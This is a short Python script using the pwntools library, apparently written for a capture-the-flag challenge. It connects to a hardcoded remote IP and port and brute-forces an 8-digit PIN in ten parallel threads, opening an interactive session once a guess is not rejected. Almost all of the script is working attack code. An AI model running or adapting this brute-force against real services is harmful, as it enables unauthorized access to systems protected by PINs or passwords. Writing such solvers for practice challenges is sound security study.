from pwn import *
import _thread 
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')


def pwn(start, end):
    io = remote('47.95.212.224',40481)
    #for i in range(21757, 99999999):
    for i in range(start , end):
        print()
        success("thread %d" % (start/10000000))
        io.sendlineafter(b'>',str(3).encode())
        io.recvuntil(b"PIN code:")
        payload = str(i)
        payload = payload.rjust(8,'0')
        success("current pin" + payload)
        io.sendline(payload.encode())
        recv = io.recvline()
        success(b"recv -->" + recv)
        if b"Wrong" in recv:
            #pause()
            continue
        else:
            io.interactive()
            break

for i in range(10):
    x = i * 10000000
    t = _thread.start_new_thread(pwn,(x, x + 9999999))

while 1:
   pass
